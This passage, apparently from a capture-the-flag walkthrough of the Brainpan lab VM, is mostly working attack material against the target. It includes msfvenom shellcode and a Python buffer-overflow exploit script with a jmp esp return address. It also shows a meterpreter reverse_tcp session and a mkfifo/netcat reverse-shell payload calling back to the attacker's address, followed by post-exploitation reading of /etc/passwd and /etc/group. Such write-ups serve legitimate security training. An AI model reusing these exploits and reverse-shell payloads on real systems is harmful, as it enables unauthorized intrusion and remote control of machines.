<div class="cssterm">
$ msfvenom -p windows/exec CMD=notepad.exe -b "\x00" -f py
  No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  No Arch selected, selecting Arch: x86 from the payload
  Found 22 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 230 (iteration=0)
  buf =&nbsp; ""
  buf += "\xb8\xeb\x66\xd9\x09\xd9\xce\xd9\x74\x24\xf4\x5e\x33"
  buf += "\xc9\xb1\x33\x31\x46\x15\x83\xee\xfc\x03\x46\x11\xe2"
  buf += "\x1e\x9a\x31\x80\xe0\x63\xc2\xf3\x69\x86\xf3\x21\x0d"
  buf += "\xc2\xa6\xf5\x46\x86\x4a\x7d\x0a\x33\xd8\xf3\x82\x34"
  buf += "\x69\xb9\xf4\x7b\x6a\x0f\x38\xd7\xa8\x11\xc4\x2a\xfd"
  buf += "\xf1\xf5\xe4\xf0\xf0\x32\x18\xfa\xa1\xeb\x56\xa9\x55"
  buf += "\x98\x2b\x72\x57\x4e\x20\xca\x2f\xeb\xf7\xbf\x85\xf2"
  buf += "\x27\x6f\x91\xbc\xdf\x1b\xfd\x1c\xe1\xc8\x1d\x60\xa8"
  buf += "\x65\xd5\x13\x2b\xac\x27\xdc\x1d\x90\xe4\xe3\x91\x1d"
  buf += "\xf4\x24\x15\xfe\x83\x5e\x65\x83\x93\xa5\x17\x5f\x11"
  buf += "\x3b\xbf\x14\x81\x9f\x41\xf8\x54\x54\x4d\xb5\x13\x32"
  buf += "\x52\x48\xf7\x49\x6e\xc1\xf6\x9d\xe6\x91\xdc\x39\xa2"
  buf += "\x42\x7c\x18\x0e\x24\x81\x7a\xf6\x99\x27\xf1\x15\xcd"
  buf += "\x5e\x58\x70\x10\xd2\xe7\x3d\x12\xec\xe7\x6d\x7b\xdd"
  buf += "\x6c\xe2\xfc\xe2\xa7\x46\xf2\xa8\xe5\xef\x9b\x74\x7c"
  buf += "\xb2\xc1\x86\xab\xf1\xff\x04\x59\x8a\xfb\x15\x28\x8f"
  buf += "\x40\x92\xc1\xfd\xd9\x77\xe5\x52\xd9\x5d\x8b\x3b\x51"
  buf += "\x3b\x23\xa5\xfd\xed\xa6\x5d\x9b\xf1"
</div>

and packed everything in to the python script:

```py
import sys,socket

eip = "\xf3\x12\x17\x31" #jmp esp address 0x311712f3
buf = "\x90"*10 #nop sled
buf += "\xb8\xeb\x66\xd9\x09\xd9\xce\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x33\x31\x46\x15\x83\xee\xfc\x03\x46\x11\xe2"
buf += "\x1e\x9a\x31\x80\xe0\x63\xc2\xf3\x69\x86\xf3\x21\x0d"
buf += "\xc2\xa6\xf5\x46\x86\x4a\x7d\x0a\x33\xd8\xf3\x82\x34"
buf += "\x69\xb9\xf4\x7b\x6a\x0f\x38\xd7\xa8\x11\xc4\x2a\xfd"
buf += "\xf1\xf5\xe4\xf0\xf0\x32\x18\xfa\xa1\xeb\x56\xa9\x55"
buf += "\x98\x2b\x72\x57\x4e\x20\xca\x2f\xeb\xf7\xbf\x85\xf2"
buf += "\x27\x6f\x91\xbc\xdf\x1b\xfd\x1c\xe1\xc8\x1d\x60\xa8"
buf += "\x65\xd5\x13\x2b\xac\x27\xdc\x1d\x90\xe4\xe3\x91\x1d"
buf += "\xf4\x24\x15\xfe\x83\x5e\x65\x83\x93\xa5\x17\x5f\x11"
buf += "\x3b\xbf\x14\x81\x9f\x41\xf8\x54\x54\x4d\xb5\x13\x32"
buf += "\x52\x48\xf7\x49\x6e\xc1\xf6\x9d\xe6\x91\xdc\x39\xa2"
buf += "\x42\x7c\x18\x0e\x24\x81\x7a\xf6\x99\x27\xf1\x15\xcd"
buf += "\x5e\x58\x70\x10\xd2\xe7\x3d\x12\xec\xe7\x6d\x7b\xdd"
buf += "\x6c\xe2\xfc\xe2\xa7\x46\xf2\xa8\xe5\xef\x9b\x74\x7c"
buf += "\xb2\xc1\x86\xab\xf1\xff\x04\x59\x8a\xfb\x15\x28\x8f"
buf += "\x40\x92\xc1\xfd\xd9\x77\xe5\x52\xd9\x5d\x8b\x3b\x51"
buf += "\x3b\x23\xa5\xfd\xed\xa6\x5d\x9b\xf1"
payload = ("a"*524) + eip + buf

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1],int(sys.argv[2])))

print s.recv(1024)
s.send(payload)
print s.recv(1024)

s.close()
```

I've started the app in ollydbg and lunched the script. Looks good:

<div class="separator" style="clear: both; text-align: center;">
  <a href="/images/2014-06-13/11.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;">
    <img border="0" src="/images/2014-06-13/11.jpg" height="359" width="400" />
  </a>
</div>

I've created another script with windows reverse tcp payload:

<div class="cssterm">
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.57.1 LPORT=4444 -b "\x00" -f py
  No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  No Arch selected, selecting Arch: x86 from the payload
  Found 22 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 314 (iteration=0)
  buf =&nbsp; ""
  buf += "\xda\xd3\xd9\x74\x24\xf4\xbf\xf9\x39\xa1\xb0\x5d\x31"
  buf += "\xc9\xb1\x48\x31\x7d\x1a\x83\xc5\x04\x03\x7d\x16\xe2"
  buf += "\x0c\xc5\x49\x36\xee\x36\x8a\x57\x67\xd3\xbb\x45\x13"
  buf += "\x97\xee\x59\x50\xf5\x02\x11\x34\xee\x91\x57\x90\x01"
  buf += "\x11\xdd\xc6\x2c\xa2\xd3\xc6\xe3\x60\x75\xba\xf9\xb4"
  buf += "\x55\x83\x31\xc9\x94\xc4\x2c\x22\xc4\x9d\x3b\x91\xf9"
  buf += "\xaa\x7e\x2a\x71\xe0\x6e\x2a\x66\xb2\x8f\x1b\x39\xc9"
  buf += "\xc9\xbb\xbb\x1e\x62\xf2\xa3\x43\x49\x4c\x5f\xb7\x39"
  buf += "\x4f\x89\x86\xc2\x61\xf5\x44\xfd\x4d\xf8\x95\x39\x69"
  buf += "\xe3\xe0\x31\x89\x9e\xf2\x81\xf3\x44\x77\x14\x53\x0e"
  buf += "\x2f\xfc\x65\xc3\xa9\x77\x69\xa8\xbe\xd0\x6e\x2f\x13"
  buf += "\x6b\x8a\xa4\x92\xbc\x1a\xfe\xb0\x18\x46\xa4\xd9\x39"
  buf += "\x22\x0b\xe6\x5a\x8a\xf4\x42\x10\x39\xe0\xfb\x7b\x56"
  buf += "\xc5\xc9\x83\xa6\x41\x5a\xf7\x94\xce\xf0\x9f\x94\x87"
  buf += "\xde\x58\xda\xbd\xa6\xf7\x25\x3e\xd6\xde\xe1\x6a\x86"
  buf += "\x48\xc3\x12\x4d\x89\xec\xc6\xc1\xd9\x42\xb9\xa1\x89"
  buf += "\x22\x69\x49\xc0\xac\x56\x69\xeb\x66\xff\x03\x11\xe1"
  buf += "\xc0\x7b\x20\xf0\xa8\x79\x53\xe3\x74\xf4\xb5\x69\x95"
  buf += "\x50\x6d\x06\x0c\xf9\xe5\xb7\xd1\xd4\x83\xf8\x5a\xda"
  buf += "\x74\xb6\xaa\x97\x66\x2f\x5b\xe2\xd5\xe6\x64\xd9\x70"
  buf += "\x07\xf1\xe5\xd2\x50\x6d\xe7\x03\x96\x32\x18\x66\xac"
  buf += "\xfb\x8c\xc9\xdb\x03\x40\xca\x1b\x52\x0a\xca\x73\x02"
  buf += "\x6e\x99\x66\x4d\xbb\x8d\x3a\xd8\x43\xe4\xef\x4b\x2b"
  buf += "\x0a\xc9\xbc\xf4\xf5\x3c\x3d\xc9\x23\x79\xbb\x3b\x46"
  buf += "\x69\x07"
</div>

started metasploit handler and executed the script:

<div class="cssterm">
$ python brainploit4.py 192.168.57.9 9999
  _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  _|_|_|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|_|_|&nbsp;
  _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  _|_|_|&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|&nbsp; _|&nbsp;&nbsp;&nbsp; _|&nbsp; _|_|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|_|_|&nbsp; _|&nbsp;&nbsp;&nbsp; _|
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; _|

  [________________________ WELCOME TO BRAINPAN _________________________]
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ENTER THE PASSWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&gt;

</div>

<div class="cssterm">
msf &gt; use exploit/multi/handler
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
  payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set LHOST 192.168.57.1
  LHOST =&gt; 192.168.57.1
msf exploit(handler) &gt; exploit

  [*] Started reverse handler on 192.168.57.1:4444
  [*] Starting the payload handler...
  [*] Sending stage (770048 bytes) to 192.168.57.9
  [*] Meterpreter session 1 opened (192.168.57.1:4444 -&gt; 192.168.57.9:35643) at 2014-06-13 12:13:26 +0200

meterpreter &gt; ls

  Listing: Z:\home\puck
  =====================

  Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Size&nbsp; Type&nbsp; Last modified&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Name
  ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ----&nbsp; ----&nbsp; -------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ----
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-06 21:23:44 +0100&nbsp; .
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 17:49:37 +0100&nbsp; ..
  100666/rw-rw-rw-&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; fil&nbsp;&nbsp; 2013-03-05 21:27:00 +0100&nbsp; .bash_history
  100666/rw-rw-rw-&nbsp; 220&nbsp;&nbsp; fil&nbsp;&nbsp; 2013-03-04 17:49:37 +0100&nbsp; .bash_logout
  100666/rw-rw-rw-&nbsp; 3637&nbsp; fil&nbsp;&nbsp; 2013-03-04 17:49:37 +0100&nbsp; .bashrc
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 19:13:51 +0100&nbsp; .cache
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 19:16:33 +0100&nbsp; .config
  100666/rw-rw-rw-&nbsp; 55&nbsp;&nbsp;&nbsp; fil&nbsp;&nbsp; 2013-03-05 21:25:15 +0100&nbsp; .lesshst
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 19:16:33 +0100&nbsp; .local
  100666/rw-rw-rw-&nbsp; 675&nbsp;&nbsp; fil&nbsp;&nbsp; 2013-03-04 17:49:37 +0100&nbsp; .profile
  100666/rw-rw-rw-&nbsp; 513&nbsp;&nbsp; fil&nbsp;&nbsp; 2013-03-06 21:23:43 +0100&nbsp; checksrv.sh
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 20:45:00 +0100&nbsp; web

meterpreter &gt; pwd
  Z:\home\puck
meterpreter &gt; cd /
meterpreter &gt; ls

  Listing: Z:\
  ============

  Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Type&nbsp; Last modified&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Name
  ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ----&nbsp; -------------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ----
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 19:02:15 +0100&nbsp; bin
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 17:19:23 +0100&nbsp; boot
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2014-06-13 14:09:49 +0200&nbsp; etc
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 17:49:37 +0100&nbsp; home
  100666/rw-rw-rw-&nbsp; 15084717&nbsp; fil&nbsp;&nbsp; 2013-03-04 17:18:57 +0100&nbsp; initrd.img
  100666/rw-rw-rw-&nbsp; 15084717&nbsp; fil&nbsp;&nbsp; 2013-03-04 17:18:57 +0100&nbsp; initrd.img.old
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 19:04:41 +0100&nbsp; lib
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 16:12:09 +0100&nbsp; lost+found
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 16:12:14 +0100&nbsp; media
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2012-10-09 16:59:43 +0200&nbsp; mnt
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 16:13:47 +0100&nbsp; opt
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-08 05:07:15 +0100&nbsp; root
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2014-06-13 14:09:53 +0200&nbsp; run
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 17:20:14 +0100&nbsp; sbin
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2012-06-11 16:43:21 +0200&nbsp; selinux
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 16:13:47 +0100&nbsp; srv
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2014-06-13 14:13:01 +0200&nbsp; tmp
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-04 16:13:47 +0100&nbsp; usr
  40777/rwxrwxrwx&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dir&nbsp;&nbsp; 2013-03-08 05:13:25 +0100&nbsp; var
  100666/rw-rw-rw-&nbsp; 5180432&nbsp;&nbsp; fil&nbsp;&nbsp; 2013-02-25 20:32:04 +0100&nbsp; vmlinuz
  100666/rw-rw-rw-&nbsp; 5180432&nbsp;&nbsp; fil&nbsp;&nbsp; 2013-02-25 20:32:04 +0100&nbsp; vmlinuz.old

meterpreter &gt;
</div>

I've got the connection and meterpreter session. I've checked few things. I was
happily surprised when I discovered that I can access linux folders. Unfortunately
I couldn't spawn shell so I decided to netcat reverse shell:

<div class="cssterm">
$ msfvenom -p linux/x86/exec CMD="mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.57.1 4444 &gt;/tmp/f" -b "\x00" -f py
  No platform was selected, choosing Msf::Module::Platform::Linux from the payload
  No Arch selected, selecting Arch: x86 from the payload
  Found 22 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 132 (iteration=0)
  buf =&nbsp; ""
  buf += "\xd9\xce\xbd\xde\x40\x6e\xf8\xd9\x74\x24\xf4\x58\x29"
  buf += "\xc9\xb1\x1b\x31\x68\x18\x03\x68\x18\x83\xe8\x22\xa2"
  buf += "\x9b\x92\xd1\x7b\xfd\x31\x83\x13\xd0\xd6\xc2\x03\x42"
  buf += "\x36\xa7\xa3\x93\x20\x68\x56\xfd\xde\xff\x75\xaf\xf6"
  buf += "\xb9\x79\x50\x07\x28\x11\x36\x6e\xd4\x8a\x96\x5f\x6c"
  buf += "\x38\xa7\xb0\xea\xf9\x24\xae\x86\xdd\x85\x44\x0b\x6e"
  buf += "\xf5\xc2\xaf\xa1\x6b\x62\x21\x91\x18\x1c\x9d\xc0\xb7"
  buf += "\xfc\xef\x24\x6e\xcc\x73\x37\x0d\x0e\xba\xfe\xe3\x60"
  buf += "\x8d\x36\x3c\x53\xd8\x01\x12\x9a\x02\x5a\x5e\xe8\x76"
  buf += "\x82\xa0\x3f\x02\xaf\xac\x10\x8c\x2f\x1a\x3c\xd9\xd1"
  buf += "\x69\x42"
</div>

It worked like a charm:

<div class="cssterm">
$ nc -l -p 4444 -v
  nc: listening on :: 4444 ...
  nc: listening on 0.0.0.0 4444 ...
  nc: connect to 192.168.57.1 4444 from 192.168.57.9 (192.168.57.9) 35644 [35644]
  /bin/sh: 0: can't access tty; job control turned off
$ id
  uid=1002(puck) gid=1002(puck) groups=1002(puck)
$ python -c 'import pty;pty.spawn("/bin/bash");'
  puck@brainpan:/home/puck$ ls -la
  ls -la
  total 48
  drwx------ 7 puck puck 4096 Mar&nbsp; 6&nbsp; 2013 .
  drwxr-xr-x 5 root root 4096 Mar&nbsp; 4&nbsp; 2013 ..
  -rw------- 1 puck puck&nbsp;&nbsp;&nbsp; 0 Mar&nbsp; 5&nbsp; 2013 .bash_history
  -rw-r--r-- 1 puck puck&nbsp; 220 Mar&nbsp; 4&nbsp; 2013 .bash_logout
  -rw-r--r-- 1 puck puck 3637 Mar&nbsp; 4&nbsp; 2013 .bashrc
  drwx------ 3 puck puck 4096 Mar&nbsp; 4&nbsp; 2013 .cache
  drwxrwxr-x 3 puck puck 4096 Mar&nbsp; 4&nbsp; 2013 .config
  -rw------- 1 puck puck&nbsp;&nbsp; 55 Mar&nbsp; 5&nbsp; 2013 .lesshst
  drwxrwxr-x 3 puck puck 4096 Mar&nbsp; 4&nbsp; 2013 .local
  -rw-r--r-- 1 puck puck&nbsp; 675 Mar&nbsp; 4&nbsp; 2013 .profile
  drwxrwxr-x 4 puck puck 4096 Jun 13 07:41 .wine
  -rwxr-xr-x 1 root root&nbsp; 513 Mar&nbsp; 6&nbsp; 2013 checksrv.sh
  drwxrwxr-x 3 puck puck 4096 Mar&nbsp; 4&nbsp; 2013 web
  puck@brainpan:/home/puck$ cat checksrv.sh
  cat checksrv.sh
  #!/bin/bash
  # run brainpan.exe if it stops
  lsof -i:9999
  if [[ $? -eq 1 ]]; then
  &nbsp;&nbsp;&nbsp; pid=`ps aux | grep brainpan.exe | grep -v grep`
  &nbsp;&nbsp;&nbsp; if [[ ! -z $pid ]]; then
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill -9 $pid
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; killall wineserver
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; killall winedevice.exe
  &nbsp;&nbsp;&nbsp; fi
  &nbsp;&nbsp;&nbsp; /usr/bin/wine /home/puck/web/bin/brainpan.exe &amp;
  fi

  # run SimpleHTTPServer if it stops
  lsof -i:10000
  if [[ $? -eq 1 ]]; then
  &nbsp;&nbsp;&nbsp; pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
  &nbsp;&nbsp;&nbsp; if [[ ! -z $pid ]]; then
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kill -9 $pid
  &nbsp;&nbsp;&nbsp; fi
  &nbsp;&nbsp;&nbsp; cd /home/puck/web
  &nbsp;&nbsp;&nbsp; /usr/bin/python -m SimpleHTTPServer 10000
  fi
  puck@brainpan:/home/puck$
</div>

Nothing interesting in user home folder....

<div class="cssterm">
puck@brainpan:/home/puck$ cd ..
  cd ..
puck@brainpan:/home$ ls
  ls
  anansi&nbsp; puck&nbsp; reynard
puck@brainpan:/home$ ls -la
  ls -la
  total 20
  drwxr-xr-x&nbsp; 5 root&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp; 4096 Mar&nbsp; 4&nbsp; 2013 .
  drwxr-xr-x 22 root&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp; 4096 Mar&nbsp; 4&nbsp; 2013 ..
  drwx------&nbsp; 4 anansi&nbsp; anansi&nbsp; 4096 Mar&nbsp; 4&nbsp; 2013 anansi
  drwx------&nbsp; 7 puck&nbsp;&nbsp;&nbsp; puck&nbsp;&nbsp;&nbsp; 4096 Mar&nbsp; 6&nbsp; 2013 puck
  drwx------&nbsp; 3 reynard reynard 4096 Mar&nbsp; 4&nbsp; 2013 reynard

</div>

Two more users in the system....

<div class="cssterm">
puck@brainpan:/home$ cd /opt
  cd /opt
puck@brainpan:/opt$ ls
  ls
puck@brainpan:/opt$ ls -la
  ls -la
  total 8
  drwxr-xr-x&nbsp; 2 root root 4096 Mar&nbsp; 4&nbsp; 2013 .
  drwxr-xr-x 22 root root 4096 Mar&nbsp; 4&nbsp; 2013 ..
puck@brainpan:/opt$ cd /etc
  cd /etc
puck@brainpan:/etc$ cat passwd
  cat passwd
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/bin/sh
  bin:x:2:2:bin:/bin:/bin/sh
  sys:x:3:3:sys:/dev:/bin/sh
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/bin/sh
  man:x:6:12:man:/var/cache/man:/bin/sh
  lp:x:7:7:lp:/var/spool/lpd:/bin/sh
  mail:x:8:8:mail:/var/mail:/bin/sh
  news:x:9:9:news:/var/spool/news:/bin/sh
  uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
  proxy:x:13:13:proxy:/bin:/bin/sh
  www-data:x:33:33:www-data:/var/www:/bin/sh
  backup:x:34:34:backup:/var/backups:/bin/sh
  list:x:38:38:Mailing List Manager:/var/list:/bin/sh
  irc:x:39:39:ircd:/var/run/ircd:/bin/sh
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
  nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
  libuuid:x:100:101::/var/lib/libuuid:/bin/sh
  syslog:x:101:103::/home/syslog:/bin/false
  messagebus:x:102:104::/var/run/dbus:/bin/false
  reynard:x:1000:1000:Reynard,,,:/home/reynard:/bin/bash
  anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash
  puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash
puck@brainpan:/etc$
</div>

one of them is probably admin:

<div class="cssterm">
puck@brainpan:/etc$ cat group
  cat group
  root:x:0:
  daemon:x:1:
  bin:x:2:
  sys:x:3:
  adm:x:4:reynard
  tty:x:5:
  disk:x:6:
  lp:x:7:
  mail:x:8:
  news:x:9:
  uucp:x:10:
  man:x:12:
  proxy:x:13:
  kmem:x:15:
  dialout:x:20:
  fax:x:21:
  voice:x:22:
  cdrom:x:24:reynard
  floppy:x:25:
  tape:x:26:
  sudo:x:27:reynard
  audio:x:29:
  dip:x:30:reynard
  www-data:x:33:
  backup:x:34:
  operator:x:37:
  list:x:38:
  irc:x:39:
  src:x:40:
  gnats:x:41:
  shadow:x:42:
  utmp:x:43:
  video:x:44:
